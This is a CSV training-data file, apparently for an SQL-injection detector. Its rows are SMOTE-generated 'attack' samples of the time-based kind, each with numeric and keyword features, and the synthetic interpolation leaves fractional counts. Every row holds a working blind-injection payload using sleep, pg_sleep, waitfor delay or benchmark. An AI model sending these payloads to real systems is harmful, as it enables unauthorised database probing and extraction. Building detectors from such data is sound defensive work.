id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000396,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000028,2.2188949721239206,66.26744755653823,24.267447556538222,3.549545439682252,20.6899300753843,10.0,27.422482518846074,8.155034962307852,0.3117113012049215,0.15097862543769633,0.4138552669001047,0.12345480645727744,0.0,0.5775174811539254,1.1550349623078509,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,2.155034962307851,0.0,0.5775174811539254,0.5775174811539254,0.42248251884607463,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000397,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000009,1.13507675248076,76.28200529288405,18.0,2.8994716571140464,13.184601587865215,15.825604234307239,38.0,9.271799470711596,0.1723785454670657,0.20531033557849185,0.4999603373455157,0.12235078160892672,0.0,0.0,0.0,0.0,0.0,1.728200529288405,0.0,6.271799470711595,0.0,0.0,1.0,1.728200529288405,0.0,0.0,0.0,0.271799470711595,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7282005292884053,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7282005292884053
SMOTE_000398,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp,nearest_attack_euclidean,R000062,1.50886685299759,76.25606282496788,17.128031412483946,2.596544316454968,16.67475043329052,2.0,44.0,13.58131239167737,0.2171946830702049,0.0262620858885442,0.5777658895479724,0.17877734149327854,4.0,0.0,0.0,0.0,0.0,1.0,0.0,8.0,0.5813123916773699,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000399,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000016,1.9665758240245133,58.28564575114767,24.642822875573835,3.959884783168887,24.31425830045907,6.628516600918136,16.0143062746557,11.328564575114767,0.4172627564332454,0.10948974267018373,0.2783023405137211,0.19494516038284976,5.671435424885233,0.0,0.6571291502295341,0.0,0.0,1.0,0.0,1.6714354248852326,0.0,0.0,0.0,1.9856937253443014,1.0,0.0,0.32856457511476705,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3285645751147672,0.0,0.3285645751147671,0.0,0.6714354248852329,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.328564575114767
SMOTE_000400,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000020,0.2078000829411227,68.82605376003494,25.88403584002329,3.6585124279001486,22.76807168004658,10.0,27.942017920011644,8.11596415997671,0.3306977842429536,0.145309499868171,0.40598808326741886,0.1180046326214566,0.05798207998835436,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0579820799883545,1.0,0.0,3.0,0.05798207998835464,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000401,attack,time,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000075,2.046037374087907,90.6458904677067,26.941643812917317,3.783705887165853,23.88328762583463,24.175068561248054,32.11671237416537,10.470821906458658,0.26428838696396295,0.2659875774154433,0.3539704270399989,0.11575360858059482,2.4124657193759727,0.0,0.0,0.0,0.0,2.0,0.0,4.529178093541343,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.5291780935413426,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.5291780935413425,0.0,0.4708219064586575,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000402,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",nearest_attack_euclidean,R000036,0.9498137660002929,89.03224559159399,27.516122795796996,3.7954923343710996,27.290306989492493,19.451631612609006,31.290306989492493,11.0,0.30616460347009583,0.21912875796518266,0.35110914616199596,0.12359749240272555,3.7419386021015013,0.0,0.0,0.0,0.0,1.7419386021015013,0.0,4.516122795796997,0.0,0.0,1.0,1.7419386021015013,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.25806139789849875,0.0,0.0,0.0,1.0,0.7419386021015013,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000403,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,0.6879224475729515,82.17602828155624,24.176028281556246,3.1900875351679323,30.0,2.0,39.0,11.176028281556247,0.36507774780389546,0.024338516520259687,0.4746010721450641,0.13598266353078073,0.8239717184437536,0.1760282815562465,0.0,0.0,1.0,0.0,0.0,8.0,0.17602828155624647,0.0,0.0,1.0,0.8239717184437534,0.1760282815562465,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000404,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,nearest_attack_euclidean,R000024,0.7464483396283185,76.81122241740451,18.0,2.6934431442271154,17.943308815470676,3.056691184529325,43.20748161160301,12.603740805801504,0.2324721036187341,0.041397151162853627,0.5623355219879665,0.16379522323044568,3.4716544077353375,0.0,0.0,0.0,0.0,1.0,0.0,7.867913601933834,0.0,0.0,0.13208639806616562,1.0,0.8679136019338345,0.0,0.0,0.13208639806616562,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8679136019338345,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8679136019338345
SMOTE_000405,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000021,2.805111310230826,61.841219581341996,24.111067133674247,3.6890655431814214,22.73015244766775,7.571372029009746,22.079390209329002,9.460304895335499,0.36841007429683875,0.1189050262397332,0.3600489291821636,0.1526359702812645,3.0,0.0,0.0,0.0,0.0,1.0,0.0,3.2698475523322506,0.0,0.0,0.0,2.460304895335499,1.0,0.0,0.0,0.7301524476677494,0.0,1.0,1.0,0.0,0.0,0.0,0.7301524476677497,1.0,0.0,0.7301524476677496,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7301524476677494
SMOTE_000406,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,2.3363118832204197,56.45752651387319,18.542473486126813,3.062966825996428,19.25484091676087,1.0,26.830106055492752,9.372579541619565,0.34154307895783165,0.017713807483122443,0.47495231085863554,0.16579080270041044,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.457526513873188,0.4575265138731882,0.4575265138731882,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5424734861268118,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.542473486126812
SMOTE_000407,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000051,1.3500031265061139,84.0,19.0,2.8928105783111304,27.0,2.0,43.0,12.0,0.32142857142857145,0.023809523809523808,0.5119047619047619,0.14285714285714285,0.4234692773312825,0.5765307226687175,0.0,0.0,1.0,0.0,0.0,9.0,0.0,0.0,0.0,1.0,0.4234692773312824,0.5765307226687175,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000408,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000071,0.36481051088993877,58.539603127156525,23.560113392240993,3.583128569519823,18.0,10.0,23.31965982327702,7.219943303879504,0.3081927477278461,0.1712181931821367,0.3972997097394042,0.12328934935061295,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.219943303879503,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000409,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000015,0.013669845804151731,62.058564509987235,19.0,3.2062463460206825,26.0,1.0,27.05856450998723,8.0,0.41896500838206147,0.016114038783925436,0.4360086425626096,0.1289123102714035,0.0,3.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000410,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,0.4320911674906188,64.26396253685382,24.852792507370765,3.9129302091186795,23.0,11.411170029483056,20.705585014741526,9.147207492629237,0.35858149976289855,0.17638000041235044,0.3220475000515438,0.14299099977320728,2.2944149852584728,0.0,1.8527925073707636,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,2.8527925073707636,1.0,0.0,0.9263962536853818,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9263962536853818,0.0,0.07360374631461808,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000411,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000001,0.7394519651285038,67.57184713138541,27.48994540406622,4.161620424213901,33.77586896975893,3.102010919186756,17.0,13.693967242439733,0.49816081931880807,0.04646197945447428,0.25277433432580976,0.20260286690090795,4.204021838373512,0.0,1.795978161626488,0.0,0.0,0.10201091918675598,0.0,2.0,0.0,0.897989080813244,0.897989080813244,3.693967242439732,1.0,0.0,0.897989080813244,0.0,0.0,0.10201091918675598,1.0,0.0,0.0,0.0,0.0,0.897989080813244,0.0,0.0,0.0,0.10201091918675598,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000412,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000037,0.05320365664954646,64.04940052884852,24.02470026442426,3.4648009877629504,20.037050396636396,10.0,27.01235013221213,7.0,0.31281783428487103,0.1561364877554032,0.4217501365309435,0.10929554142878224,0.0,0.9876498677878687,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,0.9876498677878687,0.0,0.012350132212131326,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.9876498677878687,0.01235013221213127,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000413,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000005,0.927903775233205,80.39651845350093,24.0,3.396611965117463,17.0,19.0,34.20889754994195,10.187620903558988,0.2135396516073502,0.2386619635611561,0.42157242050381144,0.12622596432768232,0.0,1.0,0.0,0.0,0.0,1.0,0.0,6.187620903558989,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000414,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000071,0.09096237060016356,57.292606555925786,23.96098579254323,3.637762392632103,17.941478688814843,10.156056829827085,22.156056829827087,7.039014207456771,0.31369331560813396,0.1768930735236077,0.38656381458815214,0.1228497962801061,0.0,0.9804928962716144,2.0,0.0,0.0,1.0195071037283856,0.0,3.019507103728386,0.0,0.0,0.0195071037283856,3.019507103728386,0.0,0.9804928962716144,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000415,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000016,0.0,55.0,23.0,3.794790516941512,23.0,4.0,17.0,11.0,0.41818181818181815,0.07272727272727272,0.3090909090909091,0.2,6.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000416,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000059,0.04400123567844383,63.814302389796495,22.053056460058144,3.3803315271113124,18.0,10.0,27.840830619825567,7.973471769970928,0.2821662711029778,0.15675903950165435,0.43613286533841406,0.12494182405695378,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.973471769970928,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000417,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000059,0.6985077532567091,61.0521005038105,22.842256998911285,3.4865302590429614,18.0,10.0,25.473229003266145,7.578871500544357,0.2957955567246192,0.16433086484701068,0.415797105839457,0.12407647258891306,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.5788715005443574,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000418,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000005,0.7277058035526018,83.0410653900884,24.301374555371012,3.3463409520878273,16.698625444628988,19.301374555371012,36.49312722314493,10.54793816694348,0.2012557273140459,0.23379682921484585,0.4382933544352875,0.1266540890358208,0.15068727768550683,0.8493127223144931,0.0,0.0,0.0,1.0,0.0,6.698625444628986,0.0,0.0,1.0,1.0,0.15068727768550694,0.8493127223144932,0.0,0.8493127223144932,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000419,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000023,0.22397590973221665,75.92874935211236,22.0,3.31912701556493,15.0,18.0,33.14299948168989,9.785749870422473,0.1977036002377912,0.23724432028534942,0.43622537556246416,0.12882670391439516,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.785749870422474,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000420,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000076,1.9184274245128294,90.80801650984644,23.326853605032905,2.997630864370174,28.88456907002194,2.0,46.80801650984643,13.115430929978062,0.32085191125530094,0.02215674661288128,0.5125515745166119,0.1444397676152058,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.673146394967093,0.4422845350109691,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.557715464989031,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.557715464989031
SMOTE_000421,attack,time,"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000022,1.199827095233728,90.33798716522546,27.33399816646078,3.8517371282014423,20.0,29.33399816646078,31.335992665843122,9.667996332921561,0.2216794565425228,0.32495098215992946,0.3465822655068697,0.10678729579067801,0.3339981664607802,0.0,2.0,0.0,0.0,2.0,0.0,4.3339981664607805,0.0,0.0,1.0,4.0,0.33399816646078034,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.3339981664607803,0.6660018335392197,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000422,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000059,0.1550861565486145,64.29710389638049,22.0,3.374506475214778,17.888586038857312,10.2971038963805,28.074275974095123,8.037137987047561,0.27854202177778187,0.15973168628570897,0.43672629193650914,0.125,0.0,0.9628620129524376,2.0,0.0,0.0,1.0371379870475623,0.0,4.0,0.0,0.0,0.03713798704756249,3.0371379870475623,0.0,0.9628620129524375,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000423,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000037,0.7249116910929092,63.880631020628705,23.403155103143543,3.428549727329166,20.71621387622775,8.925679185658376,27.11936897937129,7.119368979371291,0.324460582258433,0.1394933426775419,0.4245690915483104,0.11147698351571471,0.0,1.2387379587425835,0.0,0.0,0.0,0.8806310206287083,0.0,4.119368979371291,0.0,0.8806310206287085,0.0,0.8806310206287082,0.0,1.0,0.0,0.0,0.0,0.8806310206287082,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.8806310206287085,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1193689793712916,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000424,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000077,1.513057609513925,62.52908407559393,18.11633630237573,3.0148811697769817,21.470915924406068,3.3808783401726963,29.2063738866091,8.470915924406068,0.3436383411416607,0.05319691860259912,0.4674704281002889,0.1356943121554513,0.0,2.470915924406068,0.0,0.0,0.0,1.0,0.0,4.735457962203034,0.0,0.2645420377969663,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.2645420377969663,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7354579622030337,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000425,attack,time,select pg_sleep  (  5  )   and    (    (   'rnzp'  =  'rnzp,nearest_attack_euclidean,R000057,1.3889348542092437,58.28853676682547,18.644268383412737,3.1331493170203863,21.154147067301874,1.0,26.42292646634906,9.711463233174532,0.3619297634751708,0.01716070866285295,0.4539813387879744,0.16692818907400184,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.355731616587265,0.35573161658726576,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000426,attack,time,select pg_sleep  (  5  )   and    (    (   'rnzp'  =  'rnzp,nearest_attack_euclidean,R000057,0.41864190791138967,59.38554188227256,19.385541882272562,3.2815000228051847,23.69156649418195,1.693975388090612,25.154216752909026,8.845783247090976,0.39950990942325043,0.02769041472856819,0.4235858690055133,0.14921380684266805,2.768674870636463,0.0771083764545124,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.9228916235454876,0.0771083764545124,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0771083764545124,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0771083764545124
SMOTE_000427,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000061,1.6769411015458162,61.90004451172395,24.61250556396549,3.541891328261183,18.61250556396549,10.0,25.67503338379296,7.6125055639654935,0.3014067519392718,0.16221310523151433,0.4134078066446078,0.12297233618460607,0.6125055639654933,0.38749443603450673,2.0,0.0,0.0,1.0,0.0,3.612505563965493,0.0,0.0,0.0,3.0,0.6125055639654932,0.38749443603450673,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.6125055639654933,0.3874944360345067,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
